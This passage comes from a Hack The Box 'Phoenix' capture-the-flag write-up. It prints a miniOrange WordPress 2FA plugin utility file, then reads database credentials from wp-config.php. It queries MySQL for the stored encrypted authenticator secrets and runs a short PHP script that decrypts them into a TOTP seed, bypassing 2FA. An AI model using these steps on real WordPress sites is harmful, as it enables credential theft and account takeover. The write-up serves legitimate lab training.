class="string">&quot;KBA&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Email Verification&quot;</span>                =&gt; <span class="string">&quot;OUT OF BAND EMAIL&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTP Over SMS&quot;</span>                      =&gt; <span class="string">&quot;SMS&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;EMAIL&quot;</span>                             =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTPOverEmail&quot;</span>                                          =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Duo Authenticator&quot;</span>                 =&gt; <span class="string">&quot;Duo Authenticator&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;DUO AUTHENTICATOR&quot;</span>                                     =&gt; <span class="string">&quot;Duo Authenticator&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTP Over Email&quot;</span>                                        =&gt; <span class="string">&quot;EMAIL&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTP OVER EMAIL&quot;</span>                    =&gt; <span class="string">&quot;EMAIL&quot;</span></span><br><span class="line"></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                <span class="variable">$server_to_wpdb_2fa_methods</span> = array(</span><br><span class="line">                        <span class="string">&quot;MOBILE AUTHENTICATION&quot;</span> =&gt; <span class="string">&quot;miniOrange QR Code Authentication&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;SOFT TOKEN&quot;</span>            =&gt; <span class="string">&quot;miniOrange Soft Token&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;PUSH NOTIFICATIONS&quot;</span>    =&gt; <span class="string">&quot;miniOrange Push Notification&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;GOOGLE AUTHENTICATOR&quot;</span>  =&gt; <span class="string">&quot;Google Authenticator&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;KBA&quot;</span>                   =&gt; <span class="string">&quot;Security Questions&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OUT OF BAND EMAIL&quot;</span>     =&gt; <span class="string">&quot;Email Verification&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;SMS&quot;</span>                   =&gt; <span class="string">&quot;OTP Over SMS&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;EMAIL&quot;</span>                 =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTPOverEmail&quot;</span>                  =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTP OVER EMAIL&quot;</span>                =&gt; <span class="string">&quot;OTP Over Email&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;OTP Over SMS&quot;</span>                  =&gt; <span class="string">&quot;OTP Over SMS&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Security Questions&quot;</span>    =&gt; <span class="string">&quot;Security Questions&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Google Authenticator&quot;</span>  =&gt; <span class="string">&quot;Google Authenticator&quot;</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                 <span class="variable">$methodname</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( <span class="variable">$decode_type</span> == <span class="string">&quot;wpdb&quot;</span> ) &#123;</span><br><span class="line">                        <span class="variable">$methodname</span> = isset(<span class="variable">$wpdb_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ])?<span class="variable">$wpdb_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ]:<span class="variable">$selected_2_factor_method</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="variable">$decode_type</span> == <span class="string">&quot;server&quot;</span> ) &#123;</span><br><span class="line">                        <span class="variable">$methodname</span> = isset(<span class="variable">$server_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ])?<span class="variable">$server_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ]:<span class="variable">$selected_2_factor_method</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$methodname</span> = isset(<span class="variable">$server_to_wpdb_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ])?<span class="variable">$server_to_wpdb_2fa_methods</span>[ <span class="variable">$selected_2_factor_method</span> ]:<span class="variable">$selected_2_factor_method</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$methodname</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        public static <span class="keyword">function</span> is_same_method(<span class="variable">$method</span>,<span class="variable">$current_method</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$method</span> == <span class="variable">$current_method</span> || <span class="variable">$method</span> == MO2f_Utility::mo2f_decode_2_factor(<span class="variable">$current_method</span>,<span class="string">&#x27;wpdb&#x27;</span>) || <span class="variable">$method</span> == MO2f_Utility::mo2f_decode_2_factor(<span class="variable">$current_method</span>,<span class="string">&#x27;&#x27;</span>) || MO2f_Utility::mo2f_decode_2_factor(<span class="variable">$current_method</span>,<span class="string">&#x27;server&#x27;</span>) == <span class="variable">$method</span>)</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> get_plugin_name_by_identifier( <span class="variable">$plugin_identitifier</span> )&#123;</span><br><span class="line">                <span class="variable">$all_plugins</span> = get_plugins();</span><br><span class="line">                <span class="variable">$plugin_details</span> = <span class="variable">$all_plugins</span>[<span class="variable">$plugin_identitifier</span>];</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$plugin_details</span>[<span class="string">&quot;Name&quot;</span>] ? <span class="variable">$plugin_details</span>[<span class="string">&quot;Name&quot;</span>] : <span class="string">&quot;No Plugin selected&quot;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">    public static <span class="keyword">function</span> isBlank(<span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset(<span class="variable">$value</span>) || empty(<span class="variable">$value</span>)) <span class="built_in">return</span> TRUE;</span><br><span class="line">        <span class="built_in">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> get_index_value(<span class="variable">$var</span>,<span class="variable">$index</span>)&#123;</span><br><span class="line">        switch (<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;GLOBALS&#x27;</span>:</span><br><span class="line">                        <span class="built_in">return</span> isset(<span class="variable">$GLOBALS</span>[<span class="variable">$index</span>])?<span class="variable">$GLOBALS</span>[<span class="variable">$index</span>]:<span class="literal">false</span>;</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">    </span><br><span class="line">                default:</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> get_codes_email_content(<span class="variable">$codes</span>)&#123;</span><br><span class="line">        <span class="variable">$message</span> =  <span class="string">&#x27;&lt;table cellpadding=&quot;25&quot; style=&quot;margin:0px auto&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;</span></span><br><span class="line"><span class="string">        &lt;table cellpadding=&quot;24&quot; width=&quot;584px&quot; style=&quot;margin:0 auto;max-width:584px;background-color:#f6f4f4;border:1px solid #a8adad&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&lt;img src=&quot;https://ci5.googleusercontent.com/proxy/10EQeM1udyBOkfD2dwxGhIaMXV4lOwCRtUecpsDkZISL0JIkOL2JhaYhVp54q6Sk656rW2rpAFJFEgGQiAOVcYIIKxXYMHHMNSNB=s0-d-e1-ft#https://login.xecurify.com/moas/images/xecurify-logo.png&quot; style=&quot;color:#5fb336;text-decoration:none;display:block;width:auto;height:auto;max-height:35px&quot; class=&quot;CToWUd&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string">        &lt;table cellpadding=&quot;24&quot; style=&quot;background:#fff;border:1px solid #a8adad;width:584px;border-top:none;color:#4d4b48;font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:18px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:20px&quot;&gt;Dear Customer,&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:10px&quot;&gt;You initiated a transaction from &lt;b&gt;WordPress 2 Factor Authentication Plugin&lt;/b&gt;:&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:10px&quot;&gt;Your backup codes are:-</span></span><br><span class="line"><span class="string">        &lt;table cellspacing=&quot;10&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span> = 0; <span class="variable">$x</span> &lt; sizeof(<span class="variable">$codes</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">                        <span class="variable">$message</span> = <span class="variable">$message</span>.<span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$codes</span>[<span class="variable">$x</span>].<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">                       </span><br><span class="line">                &#125;</span><br><span class="line">        <span class="variable">$message</span> = <span class="variable">$message</span>.<span class="string">&#x27;&lt;/table&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:10px&quot;&gt;Please use this carefully as each code can only be used once. Please do not share these codes with anyone.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:10px&quot;&gt;Also, we would highly recommend you to reconfigure your two-factor after logging in.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:15px&quot;&gt;Thank you,&lt;br&gt;miniOrange Team&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:0px;font-size:11px&quot;&gt;Disclaimer: This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;&lt;/div&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string">        &lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;&#x27;</span>;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$message</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> get_codes_warning_email_content(<span class="variable">$codes_remaining</span>)&#123;</span><br><span class="line">        <span class="variable">$message</span> =  <span class="string">&#x27;&lt;table cellpadding=&quot;25&quot; style=&quot;margin:0px auto&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;</span></span><br><span class="line"><span class="string">        &lt;table cellpadding=&quot;24&quot; width=&quot;584px&quot; style=&quot;margin:0 auto;max-width:584px;background-color:#f6f4f4;border:1px solid #a8adad&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&lt;img src=&quot;https://ci5.googleusercontent.com/proxy/10EQeM1udyBOkfD2dwxGhIaMXV4lOwCRtUecpsDkZISL0JIkOL2JhaYhVp54q6Sk656rW2rpAFJFEgGQiAOVcYIIKxXYMHHMNSNB=s0-d-e1-ft#https://login.xecurify.com/moas/images/xecurify-logo.png&quot; style=&quot;color:#5fb336;text-decoration:none;display:block;width:auto;height:auto;max-height:35px&quot; class=&quot;CToWUd&quot;&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string">        &lt;table cellpadding=&quot;24&quot; style=&quot;background:#fff;border:1px solid #a8adad;width:584px;border-top:none;color:#4d4b48;font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:18px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:20px&quot;&gt;Dear Customer,&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:10px&quot;&gt;You have &#x27;</span>.<span class="variable">$codes_remaining</span>.<span class="string">&#x27; backup codes remaining. Kindly reconfigure your two-factor to avoid being locked out.&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:15px&quot;&gt;Thank you,&lt;br&gt;miniOrange Team&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;margin-top:0;margin-bottom:0px;font-size:11px&quot;&gt;Disclaimer: This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;&lt;/div&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string">        &lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;&#x27;</span>;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$message</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> mo2f_get_codes_hash(<span class="variable">$codes</span>)&#123;</span><br><span class="line">        <span class="variable">$codes_hash</span>=array();</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$x</span> = 0; <span class="variable">$x</span> &lt; sizeof(<span class="variable">$codes</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span> = <span class="variable">$codes</span>[<span class="variable">$x</span>];</span><br><span class="line">            array_push(<span class="variable">$codes_hash</span>,md5(<span class="variable">$str</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$codes_hash</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> mo2f_email_backup_codes(<span class="variable">$codes</span>, <span class="variable">$mo2f_user_email</span>)&#123;</span><br><span class="line">        <span class="variable">$subject</span>    = <span class="string">&#x27;2-Factor Authentication(Backup Codes)&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span>    = array(<span class="string">&#x27;Content-Type: text/html; charset=UTF-8&#x27;</span>);</span><br><span class="line">        <span class="variable">$message</span>    = MO2f_Utility::get_codes_email_content(<span class="variable">$codes</span>);</span><br><span class="line">        <span class="variable">$result</span>     = wp_mail(<span class="variable">$mo2f_user_email</span>,<span class="variable">$subject</span>,<span class="variable">$message</span>,<span class="variable">$headers</span>);</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static <span class="keyword">function</span> mo2f_download_backup_codes(<span class="variable">$id</span>, <span class="variable">$codes</span>)&#123;</span><br><span class="line">        update_user_meta(<span class="variable">$id</span>, <span class="string">&#x27;mo_backup_code_downloaded&#x27;</span>, 1);</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=miniOrange2-factor-BackupCodes.txt&#x27;</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Two Factor Backup Codes:&quot;</span>.PHP_EOL.PHP_EOL;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;These are the codes that can be used in case you lose your phone or cannot access your email. Please reconfigure your authentication method after login.&quot;</span>.PHP_EOL.<span class="string">&quot;Please use this carefully as each code can only be used once. Please do not share these codes with anyone..&quot;</span>.PHP_EOL.PHP_EOL;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$x</span> = 0; <span class="variable">$x</span> &lt; sizeof(<span class="variable">$codes</span>); <span class="variable">$x</span>++)&#123;</span><br><span class="line">            <span class="variable">$str1</span>= <span class="variable">$codes</span>[<span class="variable">$x</span>];</span><br><span class="line">            <span class="built_in">echo</span>((<span class="variable">$x</span>+<span class="number">1</span>).&quot;. &quot;.<span class="variable">$str1</span>.&quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">                                </span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function mo2f_debug_file(<span class="variable">$text</span>)&#123;</span><br><span class="line">        if(MoWpnsUtility::get_mo2f_db_option(&#x27;mo2f_enable_debug_log&#x27;, &#x27;site_option&#x27;) == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$debug_log_path</span> = wp_upload_dir();</span><br><span class="line">                <span class="variable">$debug_log_path</span> = <span class="variable">$debug_log_path</span>[&#x27;basedir&#x27;].DIRECTORY_SEPARATOR;</span><br><span class="line">                <span class="variable">$filename</span> = &#x27;miniorange_debug_log.txt&#x27;;</span><br><span class="line">                <span class="variable">$data</span> = &#x27;[&#x27; . date(&quot;Y/m/d&quot;).&#x27; &#x27;. time().&#x27;]:&#x27;.<span class="variable">$text</span>.&quot;\n&quot;;</span><br><span class="line">                <span class="variable">$handle</span> = fopen(<span class="variable">$debug_log_path</span>.DIRECTORY_SEPARATOR.<span class="variable">$filename</span>,&#x27;a+&#x27;);</span><br><span class="line">                        fwrite(<span class="variable">$handle</span>,<span class="variable">$data</span>);</span><br><span class="line">                        fclose(<span class="variable">$handle</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static function mo2f_mail_and_download_codes()&#123;</span><br><span class="line">      global <span class="variable">$Mo2fdbQueries</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$id</span> = get_current_user_id();</span><br><span class="line">        <span class="variable">$mo2f_user_email</span> = <span class="variable">$Mo2fdbQueries</span>-&gt;get_user_detail( &#x27;mo2f_user_email&#x27;, <span class="variable">$id</span> );</span><br><span class="line">        if(empty(<span class="variable">$mo2f_user_email</span>))&#123;</span><br><span class="line">            <span class="variable">$currentuser</span> = get_user_by( <span class="string">&#x27;id&#x27;</span>, <span class="variable">$id</span> );</span><br><span class="line">            <span class="variable">$mo2f_user_email</span> = <span class="variable">$currentuser</span>-&gt;user_email;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$generate_backup_code</span> = new Customer_Cloud_Setup();</span><br><span class="line">        <span class="variable">$codes</span>=<span class="variable">$generate_backup_code</span>-&gt;mo_2f_generate_backup_codes(<span class="variable">$mo2f_user_email</span>, site_url());</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$codes</span> == <span class="string">&#x27;LimitReached&#x27;</span>|| <span class="variable">$codes</span> == <span class="string">&#x27;UserLimitReached&#x27;</span> || <span class="variable">$codes</span> == <span class="string">&#x27;AllUsed&#x27;</span> || <span class="variable">$codes</span> == <span class="string">&#x27;invalid_request&#x27;</span>)</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$codes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$codes</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$codes</span>);</span><br><span class="line">        <span class="variable">$codes_hash</span>=MO2f_Utility::mo2f_get_codes_hash(<span class="variable">$codes</span>);</span><br><span class="line">        <span class="variable">$result</span> = MO2f_Utility::mo2f_email_backup_codes(<span class="variable">$codes</span>, <span class="variable">$mo2f_user_email</span>);</span><br><span class="line">        update_user_meta(<span class="variable">$id</span>, <span class="string">&#x27;mo_backup_code_generated&#x27;</span>, 1);</span><br><span class="line">        update_user_meta(<span class="variable">$id</span>, <span class="string">&#x27;mo_backup_code_downloaded&#x27;</span>, 1);</span><br><span class="line">        MO2f_Utility::mo2f_download_backup_codes(<span class="variable">$id</span>, <span class="variable">$codes</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>then We can grab the wordpress login from the wp-config.php file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&lt;++32%himself%FIRM%section%32++&gt;&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost:/var/run/mysqld/mysqld.sock&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>then connect to mysql to get more information:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">wp_user@phoenix:/$ mysql -uwordpress -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 2823</span><br><span class="line">Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2022, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select meta_value from wp_usermeta WHERE meta_key IN (<span class="string">&#x27;mo2f_gauth_key&#x27;</span>);</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| meta_value                                                                                                   |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA= |</span><br><span class="line">| mFeor0xmxMGd4ncJhPAuPGM6HXap6neH469PGQ2wVj23TuAYSULMTQTnQcH4SgnaO7BVPok5rTc4vqxYMYZCFNJC35KeyByT3cF05m27lvI= |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select meta_value from wp_usermeta WHERE meta_key IN (<span class="string">&#x27;mo2f_get_auth_rnd_string&#x27;</span>);</span><br><span class="line">+------------+</span><br><span class="line">| meta_value |</span><br><span class="line">+------------+</span><br><span class="line">| kHHxxX3f   |</span><br><span class="line">| M6EwACNR   |</span><br><span class="line">+------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>and then easily write an decrypt exp php file to get the key:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> decrypt_data(<span class="variable">$data</span>, <span class="variable">$key</span>) &#123;</span><br><span class="line">                <span class="variable">$c</span> = base64_decode(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$ivlen</span> = openssl_cipher_iv_length(<span class="variable">$cipher</span>=<span class="string">&quot;AES-128-CBC&quot;</span>);</span><br><span class="line">                <span class="variable">$iv</span> = substr(<span class="variable">$c</span>, 0, <span class="variable">$ivlen</span>);</span><br><span class="line">                <span class="variable">$hmac</span> = substr(<span class="variable">$c</span>, <span class="variable">$ivlen</span>, <span class="variable">$sha2len</span>=32);</span><br><span class="line">                <span class="variable">$ciphertext_raw</span> = substr(<span class="variable">$c</span>, <span class="variable">$ivlen</span>+<span class="variable">$sha2len</span>);</span><br><span class="line">                <span class="variable">$original_plaintext</span> = openssl_decrypt(<span class="variable">$ciphertext_raw</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$options</span>=OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">                <span class="variable">$calcmac</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$ciphertext_raw</span>, <span class="variable">$key</span>, <span class="variable">$as_binary</span>=<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$original_plaintext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">echo</span> decrypt_data(<span class="string">&quot;qGEPwI6RQBxF4aXM6PVuriofiwCH4mjc4ZjO3jWN5gDDX5MzLHTfDk3tRGK7vwkkTbAjoxNfqFeMjJZoSI5yPF25Hd5b8lSaF/Dpc6WMBTA=&quot;</span>,<span class="string">&quot;kHHxxX3f&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># php exp.php                                          </span></span><br><span class="line">PDEEWIVJSIDWS6WO</span><br></pre></td></tr></table></figure>

<p>then we can use OPT dynamic code to login:</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2188.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2189.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2190.jpg"></p>
</li>
</ul>
<p>but login is no use for later movement, we just need to known there is a way to this</p>
<h1 id="User-own"><a href="#User-own" class="headerlink" title="User own"></a>User own</h1><p>We can completely bypass the 2FA by renaming the plugin over at &#x2F;opt&#x2F;wordpress&#x2F; but it doesn’t get us much further than we already are. </p>
<p>Instead back to using SSH, we can look into bypassing the 2FA completely (for ssh this time, not wordpress), in the &#x2F;etc&#x2F;pam.d&#x2F;ssh config, we see reference to an accessfile:</p>
<p>read more about it:</p>
<ul>
